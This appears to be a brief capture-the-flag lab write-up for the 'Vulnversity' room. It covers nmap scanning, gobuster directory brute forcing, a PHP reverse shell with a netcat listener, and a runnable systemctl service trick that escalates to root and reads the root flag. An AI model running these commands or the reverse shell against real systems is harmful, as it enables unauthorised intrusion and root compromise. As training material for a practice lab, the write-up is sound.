# Vulnversity room
Learn about active recon, web app attacks and privilege escalation.

## what was done

* scan machine with nmap
```sh
nmap -sV <machines ip>
nmap -A -T5 <ip> -vv
nmap --script vuln <ip>
nmap -T5 -p- -vv <ip>
```

* locate directories with gobuster

```
gobuster dir -u http://<ip>:3333/ -w rockyou.txt
```

* Intercept traffic with Burp Suite

* reverse shell with php script

*https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php*

```
nc -lvp 1234
``` 

* escalate privilage by systemctl

```sh
eop=$(mktemp).service
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' >$eop

/bin/systemctl link $eop
/bin/systemctl enable --now $eop
```



## what was learnt

*Never allow submit a php file in a form*

*we need to set proxy on browser in order burpsuit can read the network traffick*


## tools

* nmap
* gobuster
* burpsuit
* reverse shell with php script
* escale privilage through systemctl